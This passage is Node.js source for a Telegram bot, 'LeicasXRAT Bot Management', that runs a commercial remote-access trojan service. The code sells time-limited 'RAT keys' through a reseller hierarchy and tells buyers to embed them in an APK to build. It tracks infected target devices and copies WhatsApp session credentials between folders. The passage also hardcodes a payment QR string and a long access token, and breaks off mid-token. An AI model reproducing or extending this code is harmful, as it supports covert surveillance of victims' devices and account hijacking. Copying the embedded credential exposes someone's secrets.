    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
          await copyCredsToVVIP(folder, sessionName); // ✅ Copy setelah konek
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}
/*
async function startUserSessions() {
  const vipDir = path.join(__dirname, 'vip');
  const baseDir = 'permenmd';

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
    const vipFolders = fs.readdirSync(vipDir).filter(f => fs.statSync(path.join(vipDir, f)).isDirectory());

    console.log(`[DEBUG] Scanning VIP folder. Found ${vipFolders.length} items.`);
    for (const sessionName of vipFolders) {
      const sessionPath = path.join(vipDir, sessionName);

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] VIP Session ${sessionName} already active.`);
        continue;
      }

      try {
        console.log(`[START] Connecting VIP session: ${sessionName}`);
        await connectSession(sessionPath, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed VIP session ${sessionName}:`, err.message);
      }
    }
  }

  // 2. Scan User Folders (Logika Anda yang disederhanakan)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); // Filter hanya folder saja

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        // ✅ Cek apakah session sudah aktif
        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}*/

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  try {
    return JSON.parse(fs.readFileSync(dbPath));
  } catch (e) {
    console.error("[⚠️ DB] database.json corrupt, trying backup...");
    const bak = dbPath + '.bak';
    if (fs.existsSync(bak)) {
      try { return JSON.parse(fs.readFileSync(bak)); } catch (_) {}
    }
    return [];
  }
}

function saveDatabase(data) {
  const tmp = dbPath + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
  if (fs.existsSync(dbPath)) fs.copyFileSync(dbPath, dbPath + '.bak');
  fs.renameSync(tmp, dbPath);
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

const REQUIRED_GROUP_ID = "-1003838770038"; // GANTI DENGAN ID GRUP WAJIB
const MAIN_DEV_ID = 5752379178; 

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) {
    // PAKAI KUTIP ("") AGAR AMAN
    fs.writeFileSync(telegramDataPath, JSON.stringify({ 
      devList: ["5752379178"], 
      roles: {} 
    }, null, 2));
  }
  let config;
  try {
    config = JSON.parse(fs.readFileSync(telegramDataPath));
  } catch (_) {
    config = { devList: ["5752379178"], roles: {} };
  }
  if (!config.devList) config.devList = [];
  if (!config.roles) config.roles = {};
  
  // --- FORCE SEMUA ID JADI STRING BIAR GAK BUG TYPE DATA ---
  config.devList = config.devList.map(id => String(id).trim());
  
  // Normalize roles keys juga jadi string
  const newRoles = {};
  for (const key in config.roles) {
    newRoles[String(key).trim()] = config.roles[key];
  }
  config.roles = newRoles;
  
  return config;
}

function getUserBotRole(id) {
  const config = loadTelegramConfig();
  const strId = String(id).trim(); // ID dari Telegram diubah jadi String bersih
  
  if (config.devList.includes(strId)) return 'dev';
  if (config.roles[strId]) return config.roles[strId].role;
  return null;
}

function saveTelegramConfig(config) {
  atomicWrite(telegramDataPath, config);
}

// --- HIRARKI AKSES YANG BENAR ---
const PERMS = {
  // Add: Hanya yang lebih tinggi yang bisa mendaftarkan
  addowner: ['dev'],
  addmod: ['owner', 'dev'],
  addpartner: ['moderator', 'owner'],
  addadmin: ['moderator', 'partner', 'owner', 'dev'],
  addreseller: ['admin', 'partner', 'moderator', 'owner', 'dev'],
  addvip: ['owner', 'dev'],
  addmember: ['reseller', 'admin', 'partner', 'moderator', 'owner', 'dev'],
  
  // Create: Yang di-add wajib bisa create buat dirinya sendiri
  createowner: ['owner', 'dev'],
  createmod: ['moderator', 'owner', 'dev'],
  createpartner: ['partner', 'moderator', 'owner'],
  createadmin: ['admin', 'moderator', 'partner', 'owner', 'dev'],
  createreseller: ['reseller', 'admin', 'partner', 'moderator', 'owner', 'dev'],
  createvip: ['vip', 'owner', 'dev'],
  createmember: ['member', 'reseller', 'admin', 'partner', 'moderator', 'owner', 'dev'],
};

function canDo(id, action) {
  const role = getUserBotRole(id);
  if (!role) return false;
  return PERMS[action]?.includes(role) || false;
}

function enforceGroup(msg, id) {
  if (msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    bot.sendMessage(id, "⚠️ [PERINGATAN]\n\nDilarang command di Private Chat!");
    const config = loadTelegramConfig();
    config.devList.forEach(dev => {
      bot.sendMessage(dev, `🚨 ALERT: [${id}](tg://user?id=${id}) mencoba command di private chat!`, { parse_mode: "Markdown" });
    });
    return false;
  }
  if (msg.chat.id.toString() !== REQUIRED_GROUP_ID) {
    bot.sendMessage(id, "⚠️ Grup ini bukan grup resmi untuk command.");
    return false;
  }
  return true;
}

function enforcePrivate(msg, id) {
  if (msg.chat.type === "group" || msg.chat.type === "supergroup") {
    return bot.sendMessage(id, "⚠️ [PERINGATAN]\n\nCommand *create* hanya bisa dilakukan di **Private Chat** bot, bukan di grup!", { parse_mode: "Markdown" }).then(() => false).catch(() => false);
  }
  return true;
}

// ==========================================
// COMMAND BOT (1x PAKAI, DURASI IKUT ADD ROLE)
// ==========================================

bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const role = getUserBotRole(id);
  let text = "👋 *LeicasXRAT Bot Management*\n\n";
  let buttons = [];

  if (role === 'dev') {
    text += "👑 Status: *Developer*\n\nPilih aksi:";
    buttons.push([{ text: "➕ Add Owner", callback_data: "m_addowner" }]);
  } else if (role) {
    const myData = loadTelegramConfig().roles[id.toString()];
    text += `🛡️ Status: *${role.charAt(0).toUpperCase() + role.slice(1)}*\n`;
    text += myData?.used ? "❌ Akun sudah pernah dibuat.\n" : "✅ Belum pernah buat akun.\n\n";
    text += "Pilih aksi:";
    buttons.push([{ text: "🆕 Create Akun", callback_data: "m_create" }]);
  } else {
    text += "⛔ Anda tidak memiliki akses.";
  }

  bot.sendMessage(id, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } });
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  
  if (data === "m_addowner") {
    bot.sendMessage(id, "Masukkan: `id_telegram durasi`\n*Contoh:* `123456 30`", { parse_mode: "Markdown" });
    bot.once("message", msg => bot.emit('message', msg));
  }
  if (data === "m_create") {
    bot.sendMessage(id, "Masukkan: `create<role> username`\n*Contoh:* `/createmember denis`", { parse_mode: "Markdown" });
    bot.once("message", msg => bot.emit('message', msg));
  }
  
  bot.answerCallbackQuery(query.id);
});

// ==========================================
// STEP 1: ADD ROLE (WAJIB GRUP, KIRIM KE GRUP)
// ==========================================
bot.onText(/^\/add(owner|mod|partner|admin|reseller|vip|member) (.+)/, async (msg, match) => {
  const id = msg.from.id;
  const action = `add${match[1]}`;
  
  if (!canDo(id, action)) return bot.sendMessage(msg.chat.id, `❌ Kamu tidak punya izin untuk *${action}*.`).catch(()=>{});
  if (!enforceGroup(msg, id)) return; // Cek Wajib Grup

  const args = match[2].trim().split(" ");
  if (args.length < 2) return bot.sendMessage(msg.chat.id, "❌ Format salah. Contoh: `/addmod id_telegram durasi`", { parse_mode: "Markdown" }).catch(()=>{});

  const targetId = args[0];
  const duration = parseInt(args[1]) || 30;

  const config = loadTelegramConfig();
  config.roles[targetId] = { role: match[1], duration: duration, used: false };
  saveTelegramConfig(config);

  // 1. Kirim sukses ke Grup
  bot.sendMessage(msg.chat.id, `✅ Berhasil add *${match[1]}*.\n\n👤 Target: ${targetId}\n⏳ Durasi Akun: ${duration} Hari`, { parse_mode: "Markdown" }).catch(()=>{});
  
  // 2. Kirim notifikasi private ke target
  try {
    await bot.sendMessage(parseInt(targetId), `✅ Kamu didaftarkan sebagai *${match[1]}*.\n⏳ Durasi: ${duration} Hari\n\n*WAJIB* buat akun dengan command /create${match[1]} di **Private Chat** bot ini!`, { parse_mode: "Markdown" });
  } catch (err) {
    if (err.code === 'ETELEGRAM' && err.response?.statusCode === 403) {
      bot.sendMessage(msg.chat.id, `⚠️ Gagal mengirim notifikasi ke ${targetId} (Belum /start).`, { parse_mode: "Markdown" }).catch(()=>{});
    }
  }

  // 3. Kirim Log ke Dev Utama
  bot.sendMessage(MAIN_DEV_ID, `🆕 *[ADD ROLE LOG]*\n\n👥 Pelaku: [${msg.from.id}](tg://user?id=${msg.from.id})\n🎯 Target: ${targetId}\n🛡️ Role: ${match[1]}\n⏳ Durasi: ${duration} Hari`, { parse_mode: "Markdown" }).catch(()=>{});
});

// ==========================================
// STEP 2: CREATE ROLE (WAJIB PRIVATE, KIRIM KE PRIVATE)
// ==========================================
bot.onText(/^\/create(owner|mod|partner|admin|reseller|vip|member) (.+)/, async (msg, match) => {
  const id = msg.from.id;
  const targetRole = match[1]; 
  const username = match[2].trim();

  if (!enforcePrivate(msg, id)) return; // Cek Wajib Private Chat

  const config = loadTelegramConfig();
  const myData = config.roles[id.toString()];

  // 1. Cek apakah dia pernah di-add
  if (!myData) {
    return bot.sendMessage(id, "❌ Kamu belum didaftarkan (Add Role).").catch(()=>{});
  }

  // 2. CEK KETAT: Role yang di-add HARUS SAMA dengan role yang di-create
  if (myData.role !== targetRole) {
    return bot.sendMessage(id, `❌ Kamu hanya bisa membuat akun dengan role *${myData.role}*, bukan *${targetRole}*.`).catch(()=>{});
  }

  // 3. Cek sekali pakai
  if (myData.used) {
    return bot.sendMessage(id, "❌ Kamu sudah pernah membuat akun. Kesempatan hanya 1 kali.").catch(()=>{});
  }

  // 4. Cek username sudah ada atau belum
  const db = loadDatabase();
  if (db.find(u => u.username === username)) {
    return bot.sendMessage(id, `❌ Username "${username}" sudah ada.`).catch(()=>{});
  }

  // 5. Proses buat akun
  const password = id.toString(); 
  const duration = myData.duration; 

  const expired = new Date();
  expired.setDate(expired.getDate() + duration);

  // ✅ AUTO GENERATE RATID 24 KARAKTER
  const ratId = generateRatId(24);
  const now = new Date();
  const expiredKey = new Date(now.getTime() + (duration * 24 * 60 * 60 * 1000));
  const keys = ratReadDB('keys.json');
  keys.push({
    key: ratId,
    created: now.toISOString(),
    expired: expiredKey.toISOString(),
    days: duration,
    owner: username,
    active: true
  });
  ratWriteDB('keys.json', keys);
  
  db.push({ 
    username, 
    password, 
    role: targetRole, 
    expiredDate: expired.toISOString().split("T")[0],
    ratId: ratId
  });
  saveDatabase(db);

  myData.used = true;
  saveTelegramConfig(config);

  // Kirim sukses ke PRIVATE CHAT
  bot.sendMessage(id, `✅ Akun *${targetRole}* berhasil dibuat!\n\n👤 User: ${username}\n🔐 Pass: ${password}\n⏳ Durasi: ${duration} Hari\n🔑 Owner ID: \`${ratId}\``, { parse_mode: "Markdown" }).catch(()=>{});

  // Kirim Log ke Dev Utama
  bot.sendMessage(MAIN_DEV_ID, `🆕 *[CREATE AKUN LOG]*\n\n👥 Pelaku: [${id}](tg://user?id=${id})\n🛡️ Role: ${targetRole}\n👤 Username: ${username}\n🔐 Password: ${password}\n⏳ Durasi: ${duration} Hari\n🔑 Owner ID: ${ratId}`, { parse_mode: "Markdown" }).catch(()=>{});
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?backup/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const strId = String(id);
  const role = config.devList.includes(strId) ? 'dev' : (config.roles?.[strId]?.role || null);

  if (!role) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya izin untuk backup.").catch(()=>{});
  }

  const statusMsg = await bot.sendMessage(chatId, "⏳ Memproses backup...").catch(()=>{});
  performBackup().then(() => {
    bot.sendMessage(chatId, "✅ Backup berhasil dikirim ke owner chat.").catch(()=>{});
  }).catch((err) => {
    bot.sendMessage(chatId, `❌ Backup gagal: ${err.message}`).catch(()=>{});
  });
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(() => {
    const targetChatId = "-1003838770038"; 
    bot.sendMessage(targetChatId, "✅ [SERVER] *SERVICES ONLINE*\n\nSystem Status: *RUNNING*\nUptime: Just started\n✅ All systems operational.", { parse_mode: "Markdown" });
  }, 3000);

function scheduleAutoClean() {
  const now = new Date();

  // 00:00 WIB = 17:00 UTC
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  // kalau sudah lewat, jadwalkan besok
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();

    // ulangi setiap hari tepat jam yang sama
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

// ==================== RAT KEY MANAGEMENT (FROM APIRAT) ====================

// Helper function untuk generate RAT Key
function generateRandomKey(length = 16) {
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const lowercase = 'abcdefghijklmnopqrstuvwxyz';
    const digits = '0123456789';
    const allChars = uppercase + lowercase + digits;
    
    let key = '';
    for (let i = 0; i < length; i++) {
        key += allChars.charAt(Math.floor(Math.random() * allChars.length));
    }
    return key;
}

// Command: /ckey <days> - Create new RAT key
bot.onText(/\/ckey (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const days = parseInt(match[1]);
    
    if (isNaN(days) || days <= 0) {
        bot.sendMessage(chatId, '❌ Invalid days! Use: /ckey 30');
        return;
    }
    
    if (days > 365) {
        bot.sendMessage(chatId, '❌ Maximum 365 days!');
        return;
    }
    
    try {
        const key = generateRandomKey(16);
        
        const now = new Date();
        const expiredDate = new Date(now.getTime() + (days * 24 * 60 * 60 * 1000));
        
        const keys = ratReadDB('keys.json');
        keys.push({
            key: key,
            created: now.toISOString(),
            expired: expiredDate.toISOString(),
            days: days,
            owner: userId.toString(),
            active: true
        });
        ratWriteDB('keys.json', keys);
        
        console.log(`[RAT KEY] Created: ${key} for ${userId} (${days} days)`);
        
        const formattedDate = expiredDate.toLocaleDateString('en-US', {
            year: 'numeric',
            month: 'long',
            day: 'numeric'
        });
        
        bot.sendMessage(chatId, `
✅ *RAT KEY CREATED!*

🔑 *Key:* \`${key}\`
📅 *Expired:* ${formattedDate}
⏳ *Duration:* ${days} days

*How to use:*
1. Open APHRODITE app
2. Go to Device Dashboard
3. Enter this key when prompted
4. Edit bpish w.json:
   \`"utu": "${key}"\`
5. Build APK and install

*Tap to copy:* \`${key}\`
        `, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error('Error creating key:', error.message);
        bot.sendMessage(chatId, '❌ Server error. Please try again later.');
    }
});

// Command: /mykeys - List your keys
bot.onText(/\/mykeys/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    try {
        const keys = ratReadDB('keys.json');
        const userKeys = keys.filter(k => k.owner === userId.toString());
        
        if (userKeys.length === 0) {
            bot.sendMessage(chatId, '📭 You have no keys yet. Create one with /ckey 30');
            return;
        }
        
        let message = `🔑 *YOUR RAT KEYS* (${userKeys.length})\n\n`;
        
        userKeys.forEach((key, index) => {
            const expiredDate = new Date(key.expired);
            const now = new Date();
            const daysLeft = Math.ceil((expiredDate - now) / (1000 * 60 * 60 * 24));
            const isExpired = daysLeft <= 0;
            const status = isExpired ? '❌ Expired' : `✅ Active (${daysLeft} days left)`;
            
            message += `${index + 1}. \`${key.key}\`\n`;
            message += `   Status: ${status}\n`;
            message += `   Created: ${new Date(key.created).toLocaleDateString()}\n\n`;
        });
        
        message += `\nUse /stats <key> to view details`;
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error('Error fetching keys:', error.message);
        bot.sendMessage(chatId, '❌ Server error. Please try again later.');
    }
});

// Command: /delkey <key> - Delete a key
bot.onText(/\/delkey (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const key = match[1].trim();
    
    try {
        let keys = ratReadDB('keys.json');
        const keyData = keys.find(k => k.key === key && k.owner === userId.toString());
        
        if (!keyData) {
            bot.sendMessage(chatId, '❌ Key not found or not owned by you.');
            return;
        }
        
        keys = keys.filter(k => !(k.key === key && k.owner === userId.toString()));
        ratWriteDB('keys.json', keys);
        
        console.log(`[RAT KEY] Deleted: ${key} by ${userId}`);
        
        bot.sendMessage(chatId, `✅ Key deleted: \`${key}\``, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error('Error deleting key:', error.message);
        bot.sendMessage(chatId, '❌ Server error. Please try again later.');
    }
});

// Command: /stats <key> - View key statistics
bot.onText(/\/stats (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const key = match[1].trim();
    
    try {
        const keys = ratReadDB('keys.json');
        const keyData = keys.find(k => k.key === key && k.owner === userId.toString());
        
        if (!keyData) {
            bot.sendMessage(chatId, '❌ Key not found or not owned by you.');
            return;
        }
        
        const targets = ratReadDB('targets.json');
        const keyTargets = targets.filter(t => t.admin_owner === key);
        
        const expiredDate = new Date(keyData.expired);
        const now = new Date();
        const daysLeft = Math.ceil((expiredDate - now) / (1000 * 60 * 60 * 24));
        const isExpired = daysLeft <= 0;
        const status = isExpired ? '❌ Expired' : `✅ Active`;
        
        const onlineTargets = keyTargets.filter(t => t.online).length;
        
        let message = `📊 *KEY STATISTICS*\n\n`;
        message += `🔑 *Key:* \`${key}\`\n`;
        message += `📈 *Status:* ${status}\n`;
        message += `⏳ *Days Left:* ${daysLeft > 0 ? daysLeft : 0} days\n`;
        message += `📅 *Created:* ${new Date(keyData.created).toLocaleDateString()}\n`;
        message += `📅 *Expires:* ${expiredDate.toLocaleDateString()}\n\n`;
        message += `📱 *Total Devices:* ${keyTargets.length}\n`;
        message += `🟢 *Online:* ${onlineTargets}\n`;
        message += `🔴 *Offline:* ${keyTargets.length - onlineTargets}\n`;
        
        if (keyTargets.length > 0) {
            message += `\n*Devices:*\n`;
            keyTargets.slice(0, 5).forEach((t, i) => {
                const statusIcon = t.online ? '🟢' : '🔴';
                message += `${i + 1}. ${statusIcon} ${t.model || 'Unknown'}\n`;
            });
            if (keyTargets.length > 5) {
                message += `... and ${keyTargets.length - 5} more\n`;
            }
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error('Error fetching stats:', error.message);
        bot.sendMessage(chatId, '❌ Server error. Please try again later.');
    }
});

bot.on('polling_error', (error) => {
    console.error('[BOT] Polling error:', error.message);
});


// ===== ROUTES =====
const ratRoutes = require('./src/routes/rat');
app.use('/api', ratRoutes); // RAT endpoints
app.use('/', ratRoutes); // Compatibility endpoints (getDevicesByRatId, etc.)

// ===== Payment Proxy (GoPay via Gomerch / kyuu2nd.dev) =====
const GOMERCH_BASE = 'https://kyuu2nd.dev/api';

function providerErrorMessage(value, fallback = 'Unknown provider error') {
  if (typeof value === 'string' && value.trim()) return value.trim();
  if (value && typeof value === 'object') {
    const nested = value.message || value.error || value.description;
    if (typeof nested === 'string' && nested.trim()) return nested.trim();
    try {
      return JSON.stringify(value);
    } catch (_) {
      return fallback;
    }
  }
  return fallback;
}

// Gomerch API: ALL endpoints are GET with query params, no Bearer header
async function gomerchFetch(path) {
  const url = `${GOMERCH_BASE}${path}`;
  const safeUrl = new URL(url);
  if (safeUrl.searchParams.has('token')) safeUrl.searchParams.set('token', '[REDACTED]');
  if (safeUrl.searchParams.has('refresh_token')) safeUrl.searchParams.set('refresh_token', '[REDACTED]');
  console.log(`[gomerch] GET ${safeUrl.toString()}`);
  let r;
  try {
    r = await fetch(url, { method: 'GET' });
  } catch (error) {
    throw new Error(`Provider unreachable: ${error.message}`);
  }

  const ct = r.headers.get('content-type') || '';
  if (!ct.includes('application/json') && !ct.includes('text/json')) {
    const text = await r.text();
    throw new Error(`Gomerch API ${r.status}: ${text.slice(0, 200)}`);
  }

  const data = await r.json();
  if (!r.ok || data?.success === false) {
    const errorMsg = providerErrorMessage(
      data?.error || data?.message,
      `HTTP ${r.status}`,
    );
    throw new Error(errorMsg);
  }
  return data;
}

// In-memory: paymentId -> { status, createdAt, role, duration, amount, gopayCreatedAt }
const paymentStore = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [pid, rec] of paymentStore) {
    if (now - rec.createdAt > 45 * 60 * 1000) paymentStore.delete(pid);
  }
}, 5 * 60 * 1000);

// In-memory Gomerch auth token store
const GOMERCH_PHONE     = process.env.GOMERCH_PHONE || '';
const GOMERCH_STATIC_QR = process.env.GOMERCH_STATIC_QR || '00020101021126610014COM.GO-JEK.WWW01189360091437635161860210G7635161860303UMI51440014ID.CO.QRIS.WWW0215ID10254352450770303UMI5204581253033605802ID59144G SHOP, SARIO6006MANADO61059511662070703A0163048AEF';

const gomerchAuth = {
  accessToken:  process.env.GOMERCH_ACCESS_TOKEN || 'eyJhbGciOiJkaXIiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMTI4R0NNIiwidHlwIjoiSldUIiwiemlwIjoiREVGIn0..rzjcEzRZGUhpvo_y.EPTCU23bfzVVL8urLchQwGZ5ZB_I-ZAEhhQuJnN_Fwvn0oh9IqDxuszN32NoQtX_KlwnRYy49QYvjpA_8mJ335uCc59PJyP0AahHVOlZ-mQ36Xos9BL7mgo8YTEOoOhEReb-2F4fk_ttJF5kipHzCSqRUW9azhNuRJdYou3tBZDVBLBw3Ufc2AI40EUApjztzgDADLHlPHUxoUqtwDih9H4UkEYRhBpa3blQfKvf3oGSzoWP8EnUV5XUJ1cjOzsePkmh4rGVTfjq5QoGRdoD2rEDHRHtG174ywaflf155pU1oOKS2POquFnCrBfih2duR8w-l9_XYXxbd2MHKlaEIQHYB0goYPumhNlUm56-HtUfTsvvbcjMqT6LFv5LyNpOnNA7KsAkSF54owT5kTFOII8a_nLOYsuvMLHFUAvy5ZK-MNblKoDIskA-v4EsIcZiJzwR1l81hTVHq7QKxgC4uApwI2lJ1PglHPILAIwhUyRUg9GQEK8ZlwhEu5ZI1kb-atJbKkC3jDdglTpMv6ogFF89Lv1NplW9zM4Sg1M8wU3QyIPbiKbyGyTyDV-wu7dPrhuzTQ2FTp9U_-lvxmSHPlWCoHRr78lG-n2ZBdScMCMRICA2T_bxRnr2FejesO50SYAQ-lsmQshPhZGxjBgUwQC7k-kYWCMcuMZ5ZZG_n5ihXbaaKLXddUUvn2L2vYhTJmLvH9bb14MZ7SE3973MODROsZqdJRxLLTLZsDEwU1wVdpNqKovwr_CPYwLarjwkD1ExrQ5Ou6xNl6G0JgvwWkQW7bTvFiDthEcGe6NxPFMRz0kXWZ0R6AQdJOURUVHrJk8eDx_camlMNYrvbrq9os-JdykyKHkv_tiYNxOt4Actf3NzatQC8OtRp4QxWqbWfc8lQicJ2drWEPhRiuKQAhcqK5ZX4CrCrRjtvEuZq4cvgy-K0WKJq7ZuWgeTa91NzEcZK3z2JkI_pls-BchzkVgC8Qeut8TLyj8fXMb7GajAxjhOctNIFwkWTHFX9dJ_2wPGFnQidOKpkcBSR8Tdhn_yGBa3ngykOMxghBLBGewH_cFqlYrrAFiwOG_yYXwCkG_CsEEqBLI3d4Vvec36vNWkQY4Ih2HaIIZw8u8FxUtu48k5PKv9siuNNZM-H02RTAOoo8zo5YT7aEpTN6BQvSBIzbpu7FPStOlzOrLSZc-n6EymtE1tpD1XyeW666J9yaO_cTqEKwBWvhxpxZjBg6YRlvLAaXFCbLmLLEwiEPTZEP7BBCDt373G932lnz3iuRKSlWqcg_6GUHdhk5vz9qHz6IEJTkW5D7dL00yEyw9wvjDDHN2_v-RD0k-82T0gJC94oJsNkX1p0q-wNpdwXUvCzLDy3Ezz2aj84Cn99L9Ots5-x8dqfFZjV2rR9xP6JqrdQDDdW9pmSX6D1IZuZJt9tw-V1SoKCX9U0ii8uN8SM2TpKTcWY0kZKg_JbHZE74kpKUOoxa-DmurPOgGYILy8IPIVujE9PbSfj-lvhAksajuJbLzS35_8LQWpuJT07Remj-AJz6tAnKvt6p9ZAwcIVMit4tYBz36SD42aQqIPGHscLtF56UTpX99jX_TomhAOuv3DCjVrQJoSPBuBlTPlJSuh_hrECB3f1bP3OCN0ftGAr49so4wTbCTxGr9c33mFg-0ebxfScztE-wOYL_1aqFq_GX5aP15AGdeW6pM4lBb3ZdTrniPHAp5v4Pm006ce2ILsOwzsO4RO7R8SAL5LqP9yvEwJJcHOulQgkagRQoKLvrYqC71u9_ds5TkoHMzV4U23wUTaRLzd2qX